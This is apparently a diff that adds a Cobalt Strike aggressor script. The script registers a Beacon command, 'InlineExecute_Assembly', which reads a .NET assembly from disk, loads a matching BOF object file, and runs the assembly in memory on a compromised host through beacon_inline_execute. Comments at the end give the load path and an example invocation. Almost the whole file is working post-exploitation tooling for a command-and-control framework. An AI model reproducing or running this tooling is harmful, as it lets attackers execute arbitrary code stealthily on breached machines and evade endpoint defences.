@@ -1,0 +1,83 @@
+beacon_command_register(
+"InlineExecute_Assembly", 
+"test1", 
+"test2");
+
+alias InlineExecute_Assembly{
+	$data = substr($0, 5);
+	@args = split(' ', $data);
+	println(@args); 
+
+	local('$AssemblyPath $AssemblyArgs');
+	$AssemblyPath = "";
+	$AssemblyArgs = "";
+
+	@Optional = @("--AssemblyPath" , "--AssemblyArgs");
+	for($i = 0; $i < size(@args) ; $i++){
+		if (@args[$i] eq "--AssemblyPath"){
+			if(@args[$i + 1] ne ""){
+				$AssemblyPath = @args[$i + 1];
+				#println($AssemblyPath);
+			}
+			
+		}
+		else if (@args[$i] eq "--AssemblyArgs"){
+			for($j = $i + 1; $j < size(@args) ; $j++){
+				if(@args[$j] in @Optional){
+					break;
+				}
+				if(strlen($AssemblyArgs) == 0){
+					$AssemblyArgs = @args[$j]
+				}
+				else{
+					$AssemblyArgs = $AssemblyArgs." ".@args[$j];
+				}
+			}
+			#println($AssemblyArgs);
+		}
+	}
+
+	# charge AssemblyPath is invaid
+	if($AssemblyPath eq "" || !-exists $AssemblyPath || !-isFile $AssemblyPath){
+		println($AssemblyPath." is vailed or does not exist\n");
+		return;
+	}
+    
+    # read .Net
+	$AssemblyHandle = openf($AssemblyPath);
+	$AssemblyLength = lof($AssemblyPath);
+	$AssemblyBytes = readb($AssemblyHandle , -1);
+	closef($AssemblyHandle);
+	if(strlen($AssemblyBytes) == 0){
+		println($AssemblyPath."load failed \n");
+	}
+	println("size of .Net is: ".$AssemblyLength);
+
+	# load bof
+	$barch  = barch($1);
+	$BofPath = script_resource("InlineExecute_Assembly_ $+ $barch $+ .obj");
+	
+	$BofHandle = openf($BofPath);
+	$BofBytes = readb($BofHandle, -1);
+	closef($BofHandle);
+	if(strlen($BofBytes) == 0){
+		println($BofPath." load failed \n");
+		return;
+	}
+	println("bof file path is: ".$BofPath);
+	println("size of bof file is:".lof($BofPath));
+
+	
+	println("args is:".$AssemblyArgs);
+	$bofArgs = bof_pack($1, "biz",  $AssemblyBytes , $AssemblyLength , $AssemblyArgs);
+	#$bofArgs = bof_pack($1, "zi",  $BofPath , $AssemblyLength);
+	btask($1, "Running Inline_Execute Assembly BOF");
+	beacon_inline_execute($1, $BofBytes, "go", $bofArgs);
+
+	clear(@Optional);
+
+}
+# load C:\Users\Administrator\Desktop\AssemblyLoader\InlineExecute_Assembly\test.cna
+# InlineExecute_Assembly --AssemblyPath C:\\Users\\Administrator\\Desktop\\AssemblyLoader\\Debug\\CSharp.exe --AssemblyArgs test1 test2 test3
+
+
